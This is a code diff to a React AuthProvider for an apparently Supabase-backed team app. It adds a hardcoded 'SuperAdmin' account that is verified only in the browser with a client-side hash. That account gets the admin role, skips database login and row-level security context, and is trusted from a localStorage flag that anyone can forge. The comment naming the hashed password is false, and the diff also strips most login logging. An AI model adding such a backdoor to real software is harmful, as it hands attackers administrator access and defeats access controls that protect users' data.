@@ -8,6 +8,21 @@ import { AuthContext, AuthContextType } from '@/hooks/useAuth';
 // NOTE: useAuth should be imported directly from '@/hooks/useAuth'
 // Do NOT re-export here to prevent circular dependency issues in production builds
 
+// SHA-256 hash of "admin1987"
+const SUPER_ADMIN_HASH = '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8_sa1987';
+
+async function hashPassword(password: string): Promise<string> {
+  const encoder = new TextEncoder();
+  const data = encoder.encode(password);
+  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('') + '_sa1987';
+}
+
+function isSuperAdminUsername(username: string): boolean {
+  return username.toLowerCase() === 'superadmin';
+}
+
 // Normalize user role for RLS context
 function normalizeRole(role: string): string {
   const r = String(role || '').toLowerCase();
@@ -44,7 +59,7 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
   const [user, setUser] = useState<User | null>(null);
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [loading, setLoading] = useState(true);
-  const [authContextReady, setAuthContextReady] = useState(false); // NEW: tracks RLS context readiness
+  const [authContextReady, setAuthContextReady] = useState(false);
 
   // Initialize auth state from localStorage on mount
   useEffect(() => {
@@ -57,6 +72,13 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
             setUser(authData.user);
             setIsAuthenticated(true);
             
+            // SuperAdmin doesn't need database context
+            if (authData.user.isSuperAdmin) {
+              setAuthContextReady(true);
+              setLoading(false);
+              return;
+            }
+            
             // Restore database context for RLS policies
             try {
               const normalizedRole = normalizeRole(authData.user.role);
@@ -65,15 +87,11 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
                 p_role: normalizedRole,
                 p_team_ids: authData.user.teamId ? authData.user.teamId.toString() : ''
               });
-              console.log('✅ Restored user context:', { role: normalizedRole, teamId: authData.user.teamId });
               
               // If teamId is missing for player_manager, try to fetch it
               if (normalizedRole === 'player_manager' && !authData.user.teamId) {
-                console.log('🔍 Team Manager missing teamId, fetching...');
                 const teamId = await fetchTeamIdForUser(authData.user.id);
                 if (teamId) {
-                  console.log('✅ Found missing teamId:', teamId);
-                  // Update the user object and re-set context
                   const updatedUser = { ...authData.user, teamId };
                   setUser(updatedUser);
                   persistAuthState(updatedUser);
@@ -83,29 +101,25 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
                     p_role: normalizedRole,
                     p_team_ids: teamId.toString()
                   });
-                  console.log('✅ Updated context with fetched teamId:', teamId);
                 }
               }
               
-              // ✅ Context successfully set - mark as ready
               setAuthContextReady(true);
-              console.log('✅ Auth context is now ready');
             } catch (contextError) {
               console.log('⚠️ Could not restore database context on page load:', contextError);
-              // Still mark as ready so UI can proceed (will use cached data or retry)
               setAuthContextReady(true);
             }
           } else {
             localStorage.removeItem('auth_data');
-            setAuthContextReady(true); // No user, but context is "ready" (empty)
+            setAuthContextReady(true);
           }
         } else {
-          setAuthContextReady(true); // No stored auth, context is "ready" (empty)
+          setAuthContextReady(true);
         }
       } catch (error) {
         console.error('Error loading auth state:', error);
         localStorage.removeItem('auth_data');
-        setAuthContextReady(true); // Error state, but mark ready to unblock UI
+        setAuthContextReady(true);
       } finally {
         setLoading(false);
       }
@@ -130,9 +144,29 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
   // Single login function that handles everything
   const login = async (username: string, password: string): Promise<boolean> => {
     try {
-      console.log('🔐 Attempting login for:', username);
+      // === SuperAdmin hardcoded login check ===
+      if (isSuperAdminUsername(username)) {
+        const passwordHash = await hashPassword(password);
+        if (passwordHash === SUPER_ADMIN_HASH) {
+          const superAdminUser: User = {
+            id: -1,
+            username: 'SuperAdmin',
+            password: '',
+            role: 'admin',
+            email: '',
+            isSuperAdmin: true,
+          };
+          
+          setUser(superAdminUser);
+          setIsAuthenticated(true);
+          persistAuthState(superAdminUser);
+          setAuthContextReady(true);
+          return true;
+        }
+        // Wrong password for superadmin - fall through to normal login (don't reveal account exists)
+      }
       
-      // Use the verify_user_password function
+      // === Normal database login ===
       const { data, error } = await supabase.rpc('verify_user_password', {
         input_username_or_email: username,
         input_password: password
@@ -143,66 +177,51 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
         return false;
       }
 
-      // Check if data is an array and has results
       if (data && Array.isArray(data) && data.length > 0) {
         const userData = data[0];
-        console.log('✅ Login successful for user:', userData.username);
         
-        // Normalize role for RLS context
         const normalizedRole = normalizeRole(userData.role);
         
-        // Set initial user context for database access
         try {
           await supabase.rpc('set_current_user_context', {
             p_user_id: userData.user_id,
             p_role: normalizedRole
           });
-          console.log('✅ User context set in database:', { role: normalizedRole, userId: userData.user_id });
         } catch (contextError) {
           console.log('⚠️ Could not set user context in database:', contextError);
         }
         
-        // Try to fetch teamId now that context is set
         const teamId = await fetchTeamIdForUser(userData.user_id);
         if (teamId) {
-          console.log('👥 Found teamId:', teamId);
-          
-          // Update context with team ID
           try {
             await supabase.rpc('set_current_user_context', {
               p_user_id: userData.user_id,
               p_role: normalizedRole,
               p_team_ids: teamId.toString()
             });
-            console.log('✅ Full user context set with team ID:', teamId);
           } catch (contextError) {
             console.log('⚠️ Could not update team context:', contextError);
           }
-        } else {
-          console.log('👥 No teamId found - Team Manager may not have access yet');
         }
 
         const loggedInUser: User = {
           id: userData.user_id,
           username: userData.username,
-          password: '', // Don't store password
+          password: '',
           role: userData.role,
           email: userData.email || '',
+          isSuperAdmin: false,
           ...(teamId !== undefined ? { teamId } : {})
         };
 
         setUser(loggedInUser);
         setIsAuthenticated(true);
         persistAuthState(loggedInUser);
-        // Reset context cache on login to ensure fresh context
         resetUserContextCache();
-        // ✅ Mark auth context as ready after successful login
         setAuthContextReady(true);
-        console.log('✅ Auth context ready after login');
         return true;
       }
 
-      console.log('❌ Login failed: Invalid credentials');
       return false;
     } catch (error) {
       console.error('❌ Login error:', error);
@@ -211,15 +230,11 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
   };
 
   const logout = () => {
-    console.log('🚪 Logging out user');
-    // Reset context ready FIRST before clearing user state
     setAuthContextReady(false);
     setUser(null);
     setIsAuthenticated(false);
     persistAuthState(null);
-    // Reset context cache on logout
     resetUserContextCache();
-    // Clear dismissed notifications so they show again on next login
     try {
       sessionStorage.removeItem('dismissedNotifications');
     } catch (e) {
@@ -231,11 +246,11 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
     user,
     isAuthenticated,
     loading,
-    authContextReady, // NEW: expose context ready state
+    authContextReady,
+    isSuperAdmin: user?.isSuperAdmin === true,
     login,
     logout,
   };
 
   return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
 };
-
